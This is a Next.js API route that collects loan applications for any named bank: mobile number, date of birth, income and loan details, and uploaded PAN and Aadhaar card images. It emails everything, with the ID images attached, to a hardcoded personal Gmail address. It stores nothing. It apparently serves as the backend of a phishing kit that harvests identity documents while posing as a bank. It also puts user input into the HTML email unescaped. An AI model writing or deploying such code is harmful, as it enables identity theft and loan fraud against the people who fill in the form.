import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { 
      bankId, 
      bankName,
      mobileNumber, 
      day, 
      month, 
      year, 
      sourceOfIncome,
      loanAmount,
      tenure,
      tenureUnit,
      consentPersonalData,
      consentPersonalizedOffers,
      consentPerfios,
      panCard,
      aadhaarCard
    } = body

    // Validate required fields
    if (!bankId || !mobileNumber || !day || !month || !year || !sourceOfIncome) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    // Validate mobile number
    const phoneRegex = /^[6-9]\d{9}$/
    if (!phoneRegex.test(mobileNumber)) {
      return NextResponse.json(
        { error: 'Invalid phone number. Please enter a valid 10-digit phone number.' },
        { status: 400 }
      )
    }

    // Validate date
    const dateOfBirth = `${day}/${month}/${year}`
    const date = new Date(parseInt(year), parseInt(month) - 1, parseInt(day))
    if (date.getDate() !== parseInt(day) || date.getMonth() !== parseInt(month) - 1 || date.getFullYear() !== parseInt(year)) {
      return NextResponse.json(
        { error: 'Invalid date of birth' },
        { status: 400 }
      )
    }

    // Email configuration
    const recipientEmail = process.env.LOAN_EMAIL || 'yamraj26yam@gmail.com'
    const subject = `New ${bankName || 'Bank'} Loan Application`
    
    // Create email body
    const emailBody = `
New Bank Loan Application

Bank Information:
Bank: ${bankName || bankId}
Bank ID: ${bankId}

Personal Information:
Mobile Number: +91 ${mobileNumber}
Date of Birth: ${dateOfBirth}
Source of Income: ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}

Loan Details:
${loanAmount ? `Loan Amount: ₹${parseInt(loanAmount).toLocaleString('en-IN')}` : ''}
${tenure ? `Tenure: ${tenure} ${tenureUnit === 'Yr' ? 'Years' : 'Months'}` : ''}

Consents:
Personal Data Consent: ${consentPersonalData ? 'Yes' : 'No'}
Personalized Offers Consent: ${consentPersonalizedOffers ? 'Yes' : 'No'}
Perfios T&C Consent: ${consentPerfios ? 'Yes' : 'No'}

---
This loan application was submitted through the bank application form.
Submitted at: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
    `.trim()

    // Log the loan application (for development)
    console.log('Bank loan application received:', {
      bankId,
      bankName,
      mobileNumber,
      dateOfBirth,
      sourceOfIncome,
      loanAmount,
      tenure,
      to: recipientEmail,
      subject,
      body: emailBody
    })

    // Prepare attachments array
    const attachments: Array<{
      filename: string
      content: string
      contentType?: string
    }> = []
    
    if (panCard && panCard.data) {
      attachments.push({
        filename: panCard.filename || 'pan-card.jpg',
        content: panCard.data,
        contentType: panCard.contentType || 'image/jpeg'
      })
    }
    
    if (aadhaarCard && aadhaarCard.data) {
      attachments.push({
        filename: aadhaarCard.filename || 'aadhaar-card.jpg',
        content: aadhaarCard.data,
        contentType: aadhaarCard.contentType || 'image/jpeg'
      })
    }

    // Send email notification using Resend
    try {
      // Send email using Resend
      const { Resend } = await import('resend')
      const resend = new Resend(process.env.RESEND_API_KEY || 're_placeholder_key')
      
      // Only send if API key is configured
      if (process.env.RESEND_API_KEY && process.env.RESEND_API_KEY !== 're_placeholder_key') {
        const emailData: any = {
          from: process.env.RESEND_FROM_EMAIL || 'onboarding@resend.dev',
          to: recipientEmail,
          subject: subject,
          text: emailBody,
          html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
              <h2 style="color: #004C8A;">New Bank Loan Application</h2>
              
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Bank Information</h3>
                <p><strong>Bank:</strong> ${bankName || bankId}</p>
                <p><strong>Bank ID:</strong> ${bankId}</p>
              </div>
              
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Personal Information</h3>
                <p><strong>Mobile Number:</strong> +91 ${mobileNumber}</p>
                <p><strong>Date of Birth:</strong> ${dateOfBirth}</p>
                <p><strong>Source of Income:</strong> ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}</p>
              </div>
              
              ${loanAmount || tenure ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Loan Details</h3>
                ${loanAmount ? `<p><strong>Loan Amount:</strong> ₹${parseInt(loanAmount).toLocaleString('en-IN')}</p>` : ''}
                ${tenure ? `<p><strong>Tenure:</strong> ${tenure} ${tenureUnit === 'Yr' ? 'Years' : 'Months'}</p>` : ''}
              </div>
              ` : ''}
              
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Consents</h3>
                <p><strong>Personal Data Consent:</strong> ${consentPersonalData ? 'Yes' : 'No'}</p>
                <p><strong>Personalized Offers Consent:</strong> ${consentPersonalizedOffers ? 'Yes' : 'No'}</p>
                <p><strong>Perfios T&C Consent:</strong> ${consentPerfios ? 'Yes' : 'No'}</p>
              </div>
              
              ${panCard && panCard.data ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">PAN Card</h3>
                <p>PAN Card image attached to this email.</p>
                <img src="data:${panCard.contentType || 'image/jpeg'};base64,${panCard.data}" alt="PAN Card" style="max-width: 100%; border: 1px solid #e2e8f0; border-radius: 4px; margin-top: 10px;" />
              </div>
              ` : ''}
              
              ${aadhaarCard && aadhaarCard.data ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Aadhaar Card</h3>
                <p>Aadhaar Card image attached to this email.</p>
                <img src="data:${aadhaarCard.contentType || 'image/jpeg'};base64,${aadhaarCard.data}" alt="Aadhaar Card" style="max-width: 100%; border: 1px solid #e2e8f0; border-radius: 4px; margin-top: 10px;" />
              </div>
              ` : ''}
              
              <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 30px 0;">
              <p style="color: #64748b; font-size: 12px;">
                This loan application was submitted through the bank application form.<br>
                Submitted at: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
              </p>
            </div>
          `,
        }
        
        // Add attachments if any
        if (attachments.length > 0) {
          emailData.attachments = attachments
        }
        
        const emailResult = await resend.emails.send(emailData)
        
        console.log('Email sent successfully to:', recipientEmail)
      } else {
        // For development: Log email that would be sent
        console.log('\n=== EMAIL TO BE SENT ===')
        console.log(`To: ${recipientEmail}`)
        console.log(`Subject: ${subject}`)
        console.log(`Body:\n${emailBody}`)
        if (attachments.length > 0) {
          console.log(`Attachments: ${attachments.map(a => a.filename).join(', ')}`)
        }
        console.log('\nTo enable email sending, set RESEND_API_KEY in .env file')
        console.log('Get your API key from: https://resend.com/api-keys')
        console.log('========================\n')
      }
    } catch (emailError: any) {
      console.error('Error sending email:', emailError)
      // Log email details even if sending fails
      console.log('\n=== EMAIL DETAILS (Sending failed) ===')
      console.log(`To: ${recipientEmail}`)
      console.log(`Subject: ${subject}`)
      console.log(`Body:\n${emailBody}`)
      if (attachments.length > 0) {
        console.log(`Attachments: ${attachments.map(a => a.filename).join(', ')}`)
      }
      console.log('=====================================\n')
      // Don't fail the request if email fails
    }

    // TODO: Store in database
    // Example:
    // await db.bankApplications.create({
    //   data: {
    //     bankId,
    //     bankName,
    //     mobileNumber,
    //     dateOfBirth,
    //     sourceOfIncome,
    //     loanAmount,
    //     tenure,
    //     tenureUnit,
    //     consentPersonalData,
    //     consentPersonalizedOffers,
    //     consentPerfios,
    //     submittedAt: new Date()
    //   }
    // })

    return NextResponse.json(
      { 
        message: 'Loan application submitted successfully. Our team will contact you shortly.',
        applicationId: `APP-${Date.now()}-${bankId.toUpperCase()}`
      },
      { status: 200 }
    )
  } catch (error) {
    console.error('Error processing bank loan application:', error)
    return NextResponse.json(
      { error: 'Internal server error. Please try again later.' },
      { status: 500 }
    )
  }
}

// GET endpoint to retrieve applications (for admin/dashboard)
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const bankId = searchParams.get('bankId')
    
    // TODO: Fetch from database
    // Example:
    // const applications = await db.bankApplications.findMany({
    //   where: bankId ? { bankId } : {},
    //   orderBy: { submittedAt: 'desc' },
    //   take: 100
    // })
    
    // For now, return mock data or empty array
    return NextResponse.json(
      { 
        message: 'Applications retrieved successfully',
        applications: [],
        // applications: applications
      },
      { status: 200 }
    )
  } catch (error) {
    console.error('Error retrieving applications:', error)
    return NextResponse.json(
      { error: 'Internal server error. Please try again later.' },
      { status: 500 }
    )
  }
}
